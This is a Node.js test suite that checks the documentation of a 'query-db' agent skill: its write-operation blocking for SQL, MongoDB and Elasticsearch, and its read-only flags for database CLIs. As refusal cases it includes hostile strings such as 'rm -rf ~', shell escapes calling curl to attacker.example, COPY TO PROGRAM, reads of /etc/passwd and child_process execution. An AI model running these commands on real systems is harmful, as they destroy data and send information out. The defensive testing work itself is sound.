const assert = require('node:assert/strict')
const fs = require('node:fs')
const path = require('node:path')
const { describe, it } = require('node:test')

const read = (skill) => fs.readFileSync(path.join(__dirname, '..', 'skills', skill, 'SKILL.md'), 'utf8')
const queryDb = read('query-db')
const analyzeDb = read('analyze-db')

const blocking = queryDb.split('### Write Operation Blocking\n')[1].split('\n### ')[0]

const clause = (label) => {
  const line = blocking.split('\n').find((l) => l.startsWith(`**${label}`))
  assert.ok(line, `Write Operation Blocking has no "${label}" clause`)
  return line
}

const codeSpans = (text) => [...text.matchAll(/`([^`]+)`/g)].map((m) => m[1])
const beforeEverythingElse = (line) => line.split('Everything else is a write')[0]

const metaPrefixes = codeSpans(clause('Refused client meta-commands').split(' — e.g.')[0].split('first non-blank characters are')[1])
const sqlReadKeywords = codeSpans(clause('SQL (MySQL/PostgreSQL/SQLite):').split(', plus')[0])
const mongoClause = clause('MongoDB:')
const mongoReadMethods = codeSpans(mongoClause.split(', chained only')[0])
const mongoModifiers = codeSpans(mongoClause.split('cursor modifiers')[1].split(')')[0])
const mongoWriteStages = codeSpans(beforeEverythingElse(mongoClause).split('holds no')[1])
const esClause = beforeEverythingElse(clause('Elasticsearch:'))
const esReadEndpoints = codeSpans(esClause.split('path ending in')[1])

const isMetaCommand = (line) => metaPrefixes.some((prefix) => line.trimStart().toLowerCase().startsWith(prefix.toLowerCase()))

const classify = {
  sql: (statement) => (sqlReadKeywords.includes(statement.trim().split(/\s+/)[0].toUpperCase()) ? 'read' : 'write'),
  mongo: (script) => {
    const calls = [...script.matchAll(/\.([A-Za-z]+)\(/g)].map((m) => m[1])
    const [method, ...chain] = calls
    if (!mongoReadMethods.includes(method)) return 'write'
    if (!chain.every((c) => mongoModifiers.includes(c))) return 'write'
    return mongoWriteStages.some((stage) => script.includes(stage)) ? 'write' : 'read'
  },
  es: ({ method, path: url, body }) => {
    if (method === 'GET' && !body) return 'read'
    if (method === 'POST' && esReadEndpoints.some((endpoint) => url.endsWith(endpoint))) return 'read'
    return 'write'
  }
}

describe('query-db Write Operation Blocking', () => {
  it('extracts every allowlist from the documented clauses', () => {
    assert.deepEqual(metaPrefixes, ['\\', '.', 'system', 'source', 'require('])
    assert.deepEqual(sqlReadKeywords, ['SELECT', 'WITH', 'EXPLAIN', 'SHOW', 'DESCRIBE', 'DESC'])
    assert.deepEqual(mongoWriteStages, ['$out', '$merge'])
    assert.deepEqual(esReadEndpoints, ['_search', '_count'])
    assert.ok(mongoReadMethods.includes('find') && mongoReadMethods.includes('aggregate'))
  })

  const metaCases = [
    ['\\! rm -rf ~', true],
    ['  \\copy orders TO \'/tmp/orders.csv\'', true],
    ['.shell id', true],
    ['.system curl https://attacker.example', true],
    ['.output /tmp/dump.txt', true],
    ['system id', true],
    ['SYSTEM id', true],
    ['source /tmp/evil.sql', true],
    ["require('child_process').execSync('id')", true],
    ['SELECT 1;', false],
    ['db.orders.find({})', false]
  ]
  for (const [line, refused] of metaCases) {
    it(`${refused ? 'refuses' : 'allows'} the client line ${JSON.stringify(line)}`, () => {
      assert.equal(isMetaCommand(line), refused)
    })
  }

  const sqlCases = [
    ['SELECT COUNT(*) FROM orders', 'read'],
    ['with t as (select 1) select * from t', 'read'],
    ['EXPLAIN SELECT * FROM orders', 'read'],
    ['SHOW TABLES', 'read'],
    ['DESCRIBE orders', 'read'],
    ["COPY orders TO PROGRAM 'curl https://attacker.example'", 'write'],
    ['GRANT ALL ON orders TO public', 'write'],
    ['REVOKE SELECT ON orders FROM app', 'write'],
    ["LOAD DATA INFILE '/etc/passwd' INTO TABLE t", 'write'],
    ['CALL purge_orders()', 'write'],
    ['MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE', 'write'],
    ["ATTACH DATABASE '/tmp/x.db' AS x", 'write'],
    ['PRAGMA writable_schema = 1', 'write'],
    ['DROP TABLE orders', 'write']
  ]
  for (const [statement, expected] of sqlCases) {
    it(`classifies SQL ${JSON.stringify(statement)} as a ${expected}`, () => {
      assert.equal(classify.sql(statement), expected)
    })
  }

  const mongoCases = [
    ['db.orders.find({ status: 1 }).sort({ _id: -1 }).limit(10)', 'read'],
    ["db.orders.aggregate([{ $match: { status: 1 } }, { $group: { _id: '$day' } }])", 'read'],
    ["db.orders.distinct('status')", 'read'],
    ['db.orders.countDocuments({})', 'read'],
    ["db.orders.aggregate([{ $match: {} }, { $out: 'orders_copy' }])", 'write'],
    ["db.orders.aggregate([{ $merge: { into: 'orders' } }])", 'write'],
    ['db.orders.bulkWrite([{ deleteMany: { filter: {} } }])', 'write'],
    ['db.orders.findOneAndUpdate({}, { $set: { x: 1 } })', 'write'],
    ['db.orders.find({}).forEach(d => db.orders.deleteOne(d))', 'write'],
    ['db.runCommand({ dropDatabase: 1 })', 'write'],
    ['db.adminCommand({ shutdown: 1 })', 'write']
  ]
  for (const [script, expected] of mongoCases) {
    it(`classifies MongoDB ${JSON.stringify(script)} as a ${expected}`, () => {
      assert.equal(classify.mongo(script), expected)
    })
  }

  const esCases = [
    [{ method: 'GET', path: '/_cat/indices' }, 'read'],
    [{ method: 'POST', path: '/orders/_search', body: '{}' }, 'read'],
    [{ method: 'POST', path: '/orders/_count', body: '{}' }, 'read'],
    [{ method: 'DELETE', path: '/orders' }, 'write'],
    [{ method: 'PUT', path: '/orders' }, 'write'],
    [{ method: 'POST', path: '/orders/_doc', body: '{}' }, 'write'],
    [{ method: 'POST', path: '/_bulk', body: '{}' }, 'write'],
    [{ method: 'POST', path: '/orders/_delete_by_query', body: '{}' }, 'write']
  ]
  for (const [request, expected] of esCases) {
    it(`classifies Elasticsearch ${request.method} ${request.path} as a ${expected}`, () => {
      assert.equal(classify.es(request), expected)
    })
  }

  for (const named of ['\\!', '.shell', '$out', '$merge', 'bulkWrite', 'COPY', 'GRANT']) {
    it(`names ${named} explicitly`, () => {
      assert.ok(codeSpans(blocking).includes(named), `${named} is not named in Write Operation Blocking`)
    })
  }
})

describe('database CLI read-only hardening', () => {
  const flags = ["--init-command='SET SESSION TRANSACTION READ ONLY'", "PGOPTIONS='-c default_transaction_read_only=on'", '--no-psqlrc', 'ON_ERROR_STOP=1', 'sqlite3 -readonly -safe', '--norc']

  for (const [skill, text] of [['query-db', queryDb], ['analyze-db', analyzeDb]]) {
    for (const flag of flags) {
      it(`${skill} documents ${flag}`, () => {
        assert.ok(text.includes(flag), `${skill} never mentions ${flag}`)
      })
    }

    it(`${skill} never runs an unhardened database CLI`, () => {
      const lines = text.split('\n')
      assert.deepEqual(lines.filter((l) => /(^|[`|] *)mysql -h /.test(l) || /(^|`)psql -[fc] /.test(l) || /sqlite3 "\$SQLITE_DB"/.test(l)), [])
      assert.deepEqual(lines.filter((l) => /mongosh "\$MONGODB_URI" --(quiet|eval)/.test(l)), [])
    })
  }

  it('query-db pre-approves no curl', () => {
    const allowed = queryDb.split('\n').find((l) => l.startsWith('allowed-tools:'))
    assert.doesNotMatch(allowed, /curl/)
  })
})
